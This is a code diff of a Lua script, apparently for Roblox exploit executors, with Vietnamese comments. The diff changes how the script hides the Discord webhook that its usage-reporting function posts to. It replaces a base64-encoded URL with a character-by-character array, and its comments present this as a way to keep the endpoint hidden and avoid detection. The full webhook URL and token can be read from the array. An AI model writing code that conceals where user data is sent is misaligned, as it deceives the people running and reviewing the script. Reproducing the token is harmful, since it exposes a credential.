@@ -1,4 +1,4 @@
--- Gửi Webhook an toàn
+-- Gửi Webhook an toàn | Không dùng Base64Decode
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
@@ -38,7 +38,7 @@ local function getDiscordTimestamp()
     return os.date("!%Y-%m-%dT%H:%M:%SZ")
 end
 
--- Đã bảo vệ
+-- Gửi usage
 local function sendUsage()
     totalUsers += 1
 
@@ -57,12 +57,20 @@ local function sendUsage()
 
     local j = HttpService:JSONEncode({ embeds = { info } })
 
-    -- 🔐 Mã hóa URL webhook
-    local encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDgwOTYzMzE0ODM3MTA3OS9RSGNxbnJSUjgtTW5oUDBHQXlTU0FtbzVaT0VHZFF0VGdzUlhQdTFlV0hXV3loeENVTXBrOEZXNFFxajdlQjdxRE05SWo="
-    local url = HttpService:Base64Decode(encoded)
+    -- 🛡️ Webhook được giấu kỹ qua table.concat
+    local w = {
+        "h","t","t","p","s",":","/","/",
+        "d","i","s","c","o","r","d",".","c","o","m",
+        "/","a","p","i","/","w","e","b","h","o","o","k","s","/",
+        "1","3","9","0","8","0","9","6","3","3","1","4","8","3","7","1","0","7","9",
+        "/","Q","H","c","q","n","R","R","8","-","M","n","h","P","0","G","A","y",
+        "S","S","A","m","o","5","Z","O","E","G","d","Q","t","T","g","s","R","X",
+        "P","u","1","e","W","H","W","W","y","h","p","C","U","M","p","k","8","F",
+        "W","4","Q","q","j","7","e","B","7","q","D","M","9","I","j"
+    }
+    local url = table.concat(w, "")
 
-    -- 🛡️ Tránh biến tên dễ bị phát hiện
-    local r = http_request or request or syn and syn.request or HttpPost
+    local r = http_request or request or (syn and syn.request) or HttpPost
     if r then
         r({
             Url = url,
